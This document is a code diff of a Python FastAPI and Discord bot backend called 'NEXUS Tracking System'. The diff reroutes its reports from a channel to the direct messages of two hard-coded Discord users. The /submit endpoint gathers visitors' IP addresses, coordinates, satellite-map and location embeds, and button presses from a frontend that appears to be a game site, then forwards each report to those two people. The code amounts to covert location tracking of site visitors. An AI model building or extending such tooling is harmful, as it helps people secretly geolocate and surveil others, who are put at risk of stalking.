@@ -24,15 +24,15 @@ load_dotenv()
 
 # ==================== CONFIGURATION ====================
 BOT_TOKEN = os.getenv('BOT_TOKEN')
-DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
 PORT = int(os.getenv('PORT', 8000))
 FRONTEND_URL = "https://gamef-swart.vercel.app"
 
+# Your Discord IDs
+YOUR_DISCORD_ID = 1302203907782606880
+BOY_DISCORD_ID = 1151697240025464852
+
 if not BOT_TOKEN:
     print("❌ BOT_TOKEN not set in .env")
-    exit(1)
-if not DISCORD_CHANNEL_ID:
-    print("❌ DISCORD_CHANNEL_ID not set in .env")
     exit(1)
 
 # ==================== DATA MODELS ====================
@@ -58,7 +58,6 @@ class VisitorInfo(BaseModel):
 visitors = {}
 visits = []
 message_queue = Queue()
-sent_message_ids = set()  # Track sent message IDs to prevent duplicates
 last_visitor_update = {}  # Track last update time per user
 
 # ==================== FASTAPI SETUP ====================
@@ -79,11 +78,12 @@ intents.message_content = True
 class NexusBot(commands.Bot):
     def __init__(self):
         super().__init__(command_prefix='!', intents=intents)
-        self.channel = None
         self.ready = False
         self.message_queue = Queue()
         self.last_messages = defaultdict(dict)  # Track last message per type per user
         self.message_cooldown = 5  # Cooldown in seconds for same message type
+        self.your_dm = None
+        self.boy_dm = None
 
     async def setup_hook(self):
         await self.tree.sync()
@@ -120,7 +120,7 @@ class NexusBot(commands.Bot):
             if not self.message_queue.empty():
                 msg = self.message_queue.get()
                 try:
-                    if msg['type'] == 'embed' and self.channel:
+                    if msg['type'] == 'embed':
                         embed = msg['data']
                         user_id = msg.get('user_id', 'unknown')
                         
@@ -131,14 +131,27 @@ class NexusBot(commands.Bot):
                         
                         # Check if we should send this message
                         if self.should_send_message(user_id, msg['subtype'], content_hash):
-                            await self.channel.send(embed=embed)
+                            # Send to your DM
+                            if self.your_dm:
+                                await self.your_dm.send(embed=embed)
+                            
+                            # Send to your boy's DM
+                            if self.boy_dm:
+                                await self.boy_dm.send(embed=embed)
+                            
                             self.record_message_sent(user_id, msg['subtype'], content_hash)
-                            print(f"✅ Sent {msg['subtype']} for user {user_id[:8]}")
+                            print(f"✅ Sent {msg['subtype']} for user {user_id[:8]} to DMs")
                         else:
                             print(f"⏭️ Skipped duplicate {msg['subtype']} for user {user_id[:8]}")
                             
-                    elif msg['type'] == 'content' and self.channel:
-                        await self.channel.send(content=msg['data'])
+                    elif msg['type'] == 'content':
+                        # Send to your DM
+                        if self.your_dm:
+                            await self.your_dm.send(content=msg['data'])
+                        
+                        # Send to your boy's DM
+                        if self.boy_dm:
+                            await self.boy_dm.send(content=msg['data'])
                         
                 except Exception as e:
                     print(f"❌ Queue send error: {e}")
@@ -153,17 +166,27 @@ async def on_ready():
     print(f'📡 Bot ID: {bot.user.id}')
     
     try:
-        bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
-        if not bot.channel:
-            bot.channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
+        # Fetch DM channels
+        try:
+            your_user = await bot.fetch_user(YOUR_DISCORD_ID)
+            bot.your_dm = your_user.dm_channel or await your_user.create_dm()
+            print(f"✅ Connected to your DM: {your_user.name}")
+        except Exception as e:
+            print(f"❌ Could not connect to your DM (ID: {YOUR_DISCORD_ID}): {e}")
+        
+        try:
+            boy_user = await bot.fetch_user(BOY_DISCORD_ID)
+            bot.boy_dm = boy_user.dm_channel or await boy_user.create_dm()
+            print(f"✅ Connected to boy's DM: {boy_user.name}")
+        except Exception as e:
+            print(f"❌ Could not connect to boy's DM (ID: {BOY_DISCORD_ID}): {e}")
         
         bot.ready = True
-        print(f'✅ Connected to channel: #{bot.channel.name}')
         
         # Start queue processor
         asyncio.create_task(bot.process_queue())
         
-        # Only send startup message if not sent recently
+        # Send startup message to both DMs
         startup_hash = hashlib.md5(b"startup").hexdigest()
         if bot.should_send_message("system", "startup", startup_hash):
             embed = Embed(
@@ -173,12 +196,16 @@ async def on_ready():
                 timestamp=datetime.now()
             )
             embed.add_field(name="Status", value="✅ Active", inline=True)
-            embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
             embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
+            embed.add_field(name="Mode", value="📨 DM Delivery", inline=True)
             
-            await bot.channel.send(embed=embed)
+            if bot.your_dm:
+                await bot.your_dm.send(embed=embed)
+            if bot.boy_dm:
+                await bot.boy_dm.send(embed=embed)
+            
             bot.record_message_sent("system", "startup", startup_hash)
-            print("✅ Startup message sent")
+            print("✅ Startup message sent to DMs")
         
     except Exception as e:
         print(f'❌ Error: {e}')
@@ -460,7 +487,7 @@ async def root():
         "status": "online",
         "bot_ready": bot.ready,
         "frontend": FRONTEND_URL,
-        "channel_id": DISCORD_CHANNEL_ID
+        "dm_recipients": [YOUR_DISCORD_ID, BOY_DISCORD_ID]
     }
 
 @app.get("/api/health")
@@ -473,7 +500,7 @@ async def health():
 
 @app.post("/submit")
 async def submit_visitor(request: Request, visitor: VisitorInfo):
-    """Receive visitor data and queue for Discord"""
+    """Receive visitor data and queue for Discord DMs"""
     try:
         data = visitor.dict()
         client_ip = request.client.host
@@ -502,8 +529,8 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
             'data': data
         })
         
-        # Queue messages for Discord with deduplication (non-blocking)
-        if bot.ready and bot.channel:
+        # Queue messages for Discord DMs with deduplication
+        if bot.ready and bot.your_dm and bot.boy_dm:
             # Queue new visitor embed (only if new)
             if is_new:
                 embed = create_new_visitor_embed(user_id, data, client_ip)
@@ -515,9 +542,8 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
                         'data': embed
                     })
             
-            # Queue location and satellite embeds (only if coordinates exist and not sent recently)
+            # Queue location and satellite embeds (only if coordinates exist)
             if data.get('coordinates'):
-                # Only send location embed if not sent in last 30 seconds for this user
                 loc_embed = create_location_embed(user_id, data, client_ip)
                 if loc_embed:
                     bot.message_queue.put({
@@ -549,7 +575,6 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
             
             # Queue button press embeds (only if button presses increased)
             if data.get('button_presses', 0) > 0:
-                # Check if button press count increased
                 last_presses = last_visitor_update.get(user_id, {}).get('button_presses', 0)
                 if data.get('button_presses') > last_presses:
                     btn_embed = create_button_embed(user_id, data.get('button_presses'), client_ip)
@@ -606,7 +631,7 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
             
             print(f"✅ Queued messages for user {user_id[:8]}")
         else:
-            print(f"⚠️ Bot not ready - skipping Discord messages")
+            print(f"⚠️ Bot not ready or DMs not connected - skipping Discord messages")
         
         return JSONResponse({
             "status": "success", 
@@ -707,7 +732,7 @@ async def help_command(interaction: discord.Interaction):
     ]
     
     embed.add_field(name="Commands", value="\n".join(commands), inline=False)
-    embed.set_footer(text="NEXUS Tracking System v2.1 - With deduplication")
+    embed.set_footer(text="NEXUS Tracking System v2.1 - DM Delivery")
     
     await interaction.response.send_message(embed=embed)
 
@@ -735,10 +760,11 @@ async def startup_event():
 # ==================== RUN ====================
 if __name__ == "__main__":
     print("=" * 50)
-    print("🔮 NEXUS TRACKING SYSTEM")
+    print("🔮 NEXUS TRACKING SYSTEM - DM MODE")
     print("=" * 50)
     print(f"📡 Bot Token: {BOT_TOKEN[:10]}..." if BOT_TOKEN else "❌ No token")
-    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
+    print(f"👤 Your DM ID: {YOUR_DISCORD_ID}")
+    print(f"👤 Boy's DM ID: {BOY_DISCORD_ID}")
     print(f"🌐 Frontend: {FRONTEND_URL}")
     print(f"💻 Status: Online")
     print("=" * 50)
